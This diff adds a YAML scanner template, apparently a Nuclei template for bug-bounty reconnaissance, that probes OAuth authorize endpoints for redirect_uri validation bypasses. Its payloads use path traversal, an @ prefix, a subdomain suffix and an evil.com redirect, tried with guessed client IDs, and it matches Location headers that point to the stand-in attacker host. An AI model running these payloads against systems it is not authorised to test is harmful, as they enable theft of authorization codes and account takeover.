@@ -1,0 +1,51 @@
+id: bb-oauth-redirect-uri-bypass
+
+info:
+  name: OAuth redirect_uri Validation Bypass
+  author: guan4tou2
+  severity: high
+  description: |
+    Tests common OAuth redirect_uri bypass techniques.
+    Directly exploitable: steal authorization codes → account takeover.
+    Tests: path traversal, open redirect, subdomain, parameter pollution.
+  tags: bb-recon,oauth,redirect,account-takeover
+
+http:
+  # Path traversal bypass
+  - method: GET
+    path:
+      - "{{BaseURL}}/oauth/authorize?client_id={{client_id}}&redirect_uri=https://{{Host}}/callback/../../../evil.com&response_type=code"
+      - "{{BaseURL}}/oauth/authorize?client_id={{client_id}}&redirect_uri=https://evil.com%40{{Host}}/callback&response_type=code"
+      - "{{BaseURL}}/oauth/authorize?client_id={{client_id}}&redirect_uri=https://{{Host}}.evil.com/callback&response_type=code"
+      - "{{BaseURL}}/auth/authorize?client_id={{client_id}}&redirect_uri=https://evil.com&response_type=code"
+      - "{{BaseURL}}/connect/authorize?client_id={{client_id}}&redirect_uri=https://evil.com&response_type=code"
+
+    payloads:
+      client_id:
+        - "app"
+        - "client"
+        - "web"
+        - "mobile"
+        - "android"
+        - "ios"
+
+    attack: batteringram
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "evil.com"
+        part: header
+
+      - type: regex
+        regex:
+          - "Location:.*evil\\.com"
+        part: header
+
+    extractors:
+      - type: kval
+        name: location
+        kval:
+          - location
+        part: header
